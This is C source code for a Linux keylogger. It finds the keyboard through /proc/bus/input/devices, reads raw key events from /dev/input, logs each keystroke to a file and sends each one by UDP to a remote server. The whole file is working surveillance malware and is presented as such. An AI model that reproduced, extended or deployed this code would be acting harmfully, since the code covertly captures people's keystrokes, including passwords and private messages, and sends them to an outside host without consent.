#include <stdio.h>
#include <linux/input.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input-event-codes.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <string.h>

#include <sys/socket.h>
#include <arpa/inet.h>

#include "keylogger.h"

#define BUFFER_SIZE 512

void capture_keys(FILE *file, char *event, int socket_desc, struct sockaddr_in server_addr)
{
	struct input_event ev;
	int server_struct_length = sizeof(server_addr);

	char path[255] = "/dev/input/";

	strcat(path, event);

	int fd = open(path, O_RDONLY);

	char map[] = "..1234567890-=..qwertyuiop{}..asdfghjkl;'...zxcvbnm,./... ";
	
	char message[2] = "0\0";
	
	while (1)
	{

		int r = read(fd, &ev, sizeof(ev));
		if ((ev.type == EV_KEY) && (ev.value == 0))
		{
			if (ev.code == 28){
				fprintf(file, "\n");
				if(sendto(socket_desc, "\n", strlen("\n"), 0,
					 (struct sockaddr*)&server_addr, server_struct_length) < 0){
					printf("error: unable to send message to external server\n");
				    }
			}
				
				
			if (ev.code == 14){
				fprintf(file, "<=");
				if(sendto(socket_desc, "<=", strlen("<="), 0,
					 (struct sockaddr*)&server_addr, server_struct_length) < 0){
					printf("error: unable to send message to external server\n");
				    }
			}
				
			else
			{
				fprintf(file, "%c", map[ev.code]);
				
				message[0] = map[ev.code];
				
				if(sendto(socket_desc, message, strlen(message), 0,
					 (struct sockaddr*)&server_addr, server_struct_length) < 0){
					printf("error: unable to send message to external server\n");
				    }
			}
			fflush(file);
		}
	}
	
	close(socket_desc);
	close(fd);
}

char *find_keyboard()
{
	FILE *ptr;
	char line[BUFFER_SIZE];
	char *handlers_line;
	char *event;
	int i = -1;

	ptr = fopen("/proc/bus/input/devices", "r");

	while (fgets(line, BUFFER_SIZE, ptr))
	{

		if (i == 1)
		{

			if (strstr(line, "EV=120013") != NULL)
			{
				break;
			}
			else
			{
				i = -1;
			}
		}
		if (i == 2)
		{
			i--;
		}

		if (strstr(line, "Handlers") != NULL)
		{
			i = 2;
			handlers_line = strdup(line);
		}
	}
	fclose(ptr);

	event = strstr(handlers_line, "event");
	char *ans = strndup(event, 6);
	return ans;
}
